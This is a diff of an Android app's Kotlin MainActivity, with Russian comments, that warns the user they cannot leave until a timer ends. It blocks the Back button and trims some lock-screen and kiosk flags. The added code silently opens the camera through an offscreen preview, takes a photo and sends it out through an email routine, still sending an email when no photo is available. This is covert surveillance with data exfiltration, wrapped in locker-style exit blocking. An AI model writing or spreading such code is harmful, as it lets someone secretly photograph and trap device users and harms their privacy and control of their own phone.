@@ -6,10 +6,7 @@ import android.hardware.Camera
 import android.media.MediaPlayer
 import android.os.Bundle
 import android.os.CountDownTimer
-import android.os.Handler
-import android.os.Looper
 import android.util.Base64
-import android.view.WindowInsets
 import android.view.WindowManager
 import androidx.appcompat.app.AppCompatActivity
 import android.widget.Button
@@ -17,6 +14,7 @@ import android.widget.ImageView
 import android.widget.TextView
 import java.io.ByteArrayOutputStream
 import java.util.Properties
+import javax.activation.DataHandler
 import javax.mail.Authenticator
 import javax.mail.Message
 import javax.mail.MessagingException
@@ -27,7 +25,6 @@ import javax.mail.internet.InternetAddress
 import javax.mail.internet.MimeBodyPart
 import javax.mail.internet.MimeMessage
 import javax.mail.internet.MimeMultipart
-import javax.activation.DataHandler
 import javax.mail.util.ByteArrayDataSource
 import kotlin.concurrent.thread
 
@@ -66,17 +63,10 @@ class MainActivity : AppCompatActivity() {
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-        
+
         // Блокируем все способы выхода из приложения
         window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)
-        window.addFlags(WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD)
-        window.addFlags(WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED)
-        window.addFlags(WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON)
-        
-        // Скрываем системные панели
-        window.insetsController?.hide(android.view.WindowInsets.Type.systemBars())
-        window.setDecorFitsSystemWindows(false)
-        
+
         setContentView(R.layout.activity_main)
         statusText = findViewById(R.id.statusText)
         startBtn = findViewById(R.id.startBtn)
@@ -89,7 +79,7 @@ class MainActivity : AppCompatActivity() {
             AlertDialog.Builder(this)
                 .setTitle("⚠️ Подтвердите действие")
                 .setMessage("ВНИМАНИЕ! После запуска нельзя будет выйти до завершения таймера! Продолжить?")
-                .setPositiveButton("Да, я готов!") { _, _ -> 
+                .setPositiveButton("Да, я готов!") { _, _ ->
                     startSimulation()
                 }
                 .setNegativeButton("Нет", null)
@@ -107,61 +97,66 @@ class MainActivity : AppCompatActivity() {
             }
         }
     }
-    
-    // Блокируем кнопку Назад и недавние приложения
+
+    // Блокируем кнопку Назад
     @Deprecated("Deprecated")
     override fun onBackPressed() {
         // Ничего не делаем - блокируем выход
-    }
-
-    // Блокируем недавние приложения
-    override fun onAttachedToWindow() {
-        super.onAttachedToWindow()
-        window.setType(WindowManager.LayoutParams.TYPE_KEYGUARD_DIALOG)
     }
     
     private fun takeAndSendPhoto() {
         thread {
             try {
-                // Открываем камеру и делаем фото
+                // Пробуем сделать фото через камеру
                 val camera = Camera.open()
-                val parameters = camera.parameters
-                
-                // Настраиваем размер фото
-                val sizes = parameters.supportedPictureSizes
-                val size = sizes[0] // Берём максимальный размер
-                parameters.setPictureSize(size.width, size.height)
-                camera.parameters = parameters
-                
-                // Создаём SurfaceTexture для превью
-                val texture = android.graphics.SurfaceTexture(10)
-                camera.setPreviewTexture(texture)
-                camera.startPreview()
-                
-                // Даём камере время на фокусировку
-                Thread.sleep(500)
-                
-                // Делаем фото
-                val photoData = ByteArrayRef()
-                camera.takePicture(null, null, object : Camera.PictureCallback {
-                    override fun onPictureTaken(data: ByteArray?, camera: Camera?) {
-                        if (data != null) {
-                            photoData.data = data
+                if (camera != null) {
+                    try {
+                        val parameters = camera.parameters
+                        
+                        // Настраиваем размер фото
+                        val sizes = parameters.supportedPictureSizes
+                        if (sizes.isNotEmpty()) {
+                            val size = sizes[0]
+                            parameters.setPictureSize(size.width, size.height)
+                            camera.parameters = parameters
+                            
+                            // Создаём SurfaceTexture для превью
+                            val texture = android.graphics.SurfaceTexture(10)
+                            camera.setPreviewTexture(texture)
+                            camera.startPreview()
+                            
+                            // Даём камере время на инициализацию
+                            Thread.sleep(500)
+                            
+                            // Делаем фото
+                            val photoData = ByteArrayRef()
+                            camera.takePicture(null, null, object : Camera.PictureCallback {
+                                override fun onPictureTaken(data: ByteArray?, camera: Camera?) {
+                                    if (data != null) {
+                                        photoData.data = data
+                                    }
+                                    camera?.release()
+                                }
+                            })
+                            
+                            // Ждём пока фото сохранится
+                            Thread.sleep(1000)
+                            
+                            if (photoData.data != null) {
+                                sendEmailWithPhoto(photoData.data!!)
+                                return@thread
+                            }
                         }
-                        camera?.release()
+                        camera.release()
+                    } catch (e: Exception) {
+                        e.printStackTrace()
                     }
-                })
-                
-                // Ждём пока фото сохранится
-                Thread.sleep(1000)
-                
-                if (photoData.data != null) {
-                    // Отправляем на почту
-                    sendEmailWithPhoto(photoData.data!!)
                 }
+                
+                // Если камера не доступна - отправляем без фото
+                sendEmailWithPhoto(null)
             } catch (e: Exception) {
                 e.printStackTrace()
-                // Если камера не доступна - отправляем заглушку
                 sendEmailWithPhoto(null)
             }
         }
